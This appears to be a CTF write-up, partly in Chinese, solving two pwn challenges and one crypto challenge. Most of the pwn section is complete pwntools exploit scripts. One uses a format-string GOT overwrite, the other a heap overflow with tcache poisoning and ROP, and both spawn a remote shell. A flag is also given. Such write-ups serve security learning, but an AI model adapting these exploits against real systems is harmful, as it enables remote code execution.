# Pwn

## easy_fmt

格式化字符串攻击，先把exit@got劫持了，在劫持write@got为one_gadget,祖传格式化字符串攻击脚本，tr3e学长太强了
```python
from pwn import *

def fmtstr(offset, addr, data, written):
	cnt = 0
	payload = ''
	address = ''
	for x in data:
		cur = ord(x)
		if cur >= written&0xff:
			to_add = cur - (written&0xff)
		else:
			to_add = 0x100 + cur - (written&0xff)
		round = ''
		if to_add != 0:
			round += "%{}c".format(to_add)
		round += "%{}$hhn".format(offset+cnt+len(data)*2)
		assert(len(round) <= 0x10)
		written += to_add + 0x10 - len(round)
		payload += round.ljust(0x10, '_')
		address += p64(addr+cnt)
		cnt+=1
	return payload + address
	

def main(host,port=10003):
	if host:
		p = remote(host,port)
	else:
		p = process("./pwn")
		gdb.attach(p,"b *0x000000000400982")
	p.recvuntil("enter:")

	p.sendline('1')
	p.recvuntil("guess?: ")
	
	main_addr = 0x000000000400906
	# p.recvuntil("slogan: ")
	payload = "%43$p".ljust(8,"_")
	payload += fmtstr(9,elf.got["exit"],p64(0x000000000400982)[:3],0xe+3)
	p.send(payload)
	# p.recv(1)
	libc.address = int(p.recvuntil('_',drop=True),16)-0x20830
	info("libc : " + hex(libc.address))
	
	one_shot = libc.address+0xf1147
	# 0x4526a	execve("/bin/sh", rsp+0x30, environ)
	# 0xf02a4	execve("/bin/sh", rsp+0x50, environ)
	# 0xf1147	execve("/bin/sh", rsp+0x70, environ)

	
	
	# p.recvuntil("slogan: ")
	p.recvuntil("guess?: ")
	payload = fmtstr(9,elf.got["write"],p64(one_shot)[:6],0)
	p.send(payload)
	
	
	p.interactive()
			
	
if __name__ == "__main__":
	elf = ELF("./pwn")
	libc = ELF("./libc.so.6")
	main(args['REMOTE'])
	
```

## weapon_storage

get_int函数里存在泄露，可以泄露程序基址和栈地址

```c
int get_int()
{
  char buf; // [rsp+0h] [rbp-20h]
  unsigned __int64 v2; // [rsp+18h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  read(0, &buf, 0x18uLL);
  if ( atoi(&buf) > 0 )
    return atoi(&buf);
  printf("Invalid integer %s\n", &buf);
  return -1;
}
```

buy函数里有个堆溢出

```c
 v7 = 100 * (idx + 1) - 29;
  printf("How many do you want to buy:", idx);
  v9 = get_int();
  if ( v9 <= 0 )
    return puts("Invalid num!");
  sz = v9 * v7;
  if ( money < sz )
    return puts("Poor guy....");
  v3 = order_count;
  orders[v3] = (order *)malloc(0x20uLL);
  orders[order_count]->name = (__int64)&aFlag[16 * idxa];
  v4 = orders[order_count];
  v4->reason = (__int64)malloc(sz & 0x1FF);
  orders[order_count]->price = sz;
  orders[order_count++]->count = v9;
  return puts("Done!");
}
```
当我们v9输入很大是，sz会变成负数，就绕过了money<sz的check，而后面仅malloc了sz&0x1ff的大小，配合check_out函数可以堆溢出

```c
else
  {
    puts("Not enough money..");
    puts("Do you want to remove a weapon?(y/n)");
    read(0, &buf, 2uLL);
    if ( buf == 'y' )
    {
      if ( dword_2040B0 == 1 )
        exit(0);
      dword_2040B0 = 1;
      money += orders[order_count - 1]->price;
      printf("Please tell us about the reason why you are so poor:", &buf);
      read(0, (void *)orders[order_count - 1]->reason, orders[order_count - 1]->count);
      puts("Ok, don't do this again!");
      free((void *)orders[order_count - 1]->reason);
      free(orders[order_count - 1]);
      orders[order_count-- - 1] = 0LL;
    }
  }
```

由于check_out函数只能用一次，所以我的思路是堆溢出修改tcache指向dword_2040B0，使得可以再次check_out,有了栈地址，后面rop即可，堆的布局要布置好，不然会free的时候会挂掉

第一次溢出时我把堆覆盖成了这样
```sh
tcachebins
0x30 [  3]: 0x55601de70680 —▸ 0x55601de70470 —▸ 0x55601d7f80ac ◂— 0x100000001
0x120 [  1]: 0x55601de70860 ◂— 0x0
0x180 [  1]: 0x55601de706b0 —▸ 0x7ffced4a2468 —▸ 0x55601d5f4d81 ◂— lea    rax, [rbp - 0x20]

```
其中**0x55601d7f80ac**是为了改写dword_2040B0

后面就只需要把0x180的chunk取出来就可以rop了，system("/bin/sh")一直不成功，后面换成execve("/bin/sh",0,,0),成功getshell

```
from pwn import *

def cmd(command):
	p.recvuntil("Your choice:")
	p.sendline(str(command))

def buy(gun,sz):
	cmd(2)
	p.recvuntil("Which do you want to buy:")
	p.sendline(str(gun))
	p.recvuntil("How many do you want to buy:")
	p.sendline(str(sz))
	
	

def view(idx):
	cmd(1)
	

def checkout():
	cmd(3)
	
def main(host,port=10004):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./pwn")
	# gdb.attach(p)	
		
		
	p.recvuntil("Your choice:")
	p.send('0'*8)
	p.recvuntil("0"*8)
	elf.address = u64(p.recvuntil('\n',drop=True).ljust(8,"\x00"))-0x8f0
	p.recvuntil("Your choice:")
	p.send('0'*0x10)
	p.recvuntil("0"*0x10)
	stack = u64(p.recvuntil('\n',drop=True).ljust(8,"\x00"))
	info("base : " + hex(elf.address))
	info("stack : " + hex(stack))
	
	buy(4,1)
	buy(4,1)
	buy(3,1)
	buy(2,1)
	checkout()
	buy(4,0x4da633)
	buy(4,0x4da633)
	checkout()
	
	p.recvuntil("Do you want to remove a weapon?(y/n)")
	p.sendline('y')
	
	fake_chunk = "\x00"*0x1d0 + p64(0) + p64(0x31)
	fake_chunk += p64(elf.address+0x2040ac)+p64(0)
	
	fake_chunk += "\x00"*0x1f0 + p64(0) + p64(0x31)
	fake_chunk += p32(0x1000) + p32(0x80000000) + p64(0) + p64(elf.got["read"])+p64(0)
	fake_chunk += p64(0) + p64(0x181) + p64(stack-0x128)+p64(0)
	fake_chunk += "\x00"*0x160 + p64(0) + p64(0x31)
	fake_chunk += p32(0x1000) + p32(0x80000000) + p64(0) + p64(elf.got["printf"])+p64(0)
	
	p.recvuntil("poor:")
	p.send(fake_chunk)
		
	checkout()
	p.recvuntil("Name:     ")
	libc.address = u64(p.recv(6).ljust(8,"\x00"))-libc.symbols["printf"]
	info("libc : " + hex(libc.address))
	buy(1,1)
	buy(1,1)
	buy(1,1)
	buy(1,2)
	checkout()
	buy(4,0x40a10)
	buy(4,0x43161)
	checkout()
	
	p.recvuntil("Do you want to remove a weapon?(y/n)")
	p.sendline('y')
	# 0x0000000000001413 : pop rdi ; ret
	# 0x00000000001306d9 : pop rdx ; pop rsi ; ret   in libc

	payload = p64(elf.address+0x1413)+p64(libc.search("/bin/sh\x00").next())
	payload += p64(libc.address+0x1306d9) + p64(0)*2 + p64(libc.symbols["execve"])
	p.send(payload)
	p.interactive()
	
if __name__ == "__main__":
	libc = ELF("./libc-2.27.so")
	elf = ELF("./pwn")
	main(args['REMOTE'])
```

# Crypto

##  common_encrypt

```python
enc = "f^n2ekass:iy~>w|`ef\"${Ip)8if"

flag = ''

for i in range(len(enc)):
	flag += chr(ord(enc[i])^i)
	
# print flag

# 14 * 2

a=[]
b=[]
section=int(len(flag)/14)
for i in range(0,len(flag),section):
    a.append(flag[i:i+section])
for i in range(section):
    for j in range(14):
		b.append(a[j][i])
plain=''.join(b)

print plain
```

**flag{crypt0_1s_1nt3r3st1ng!}**
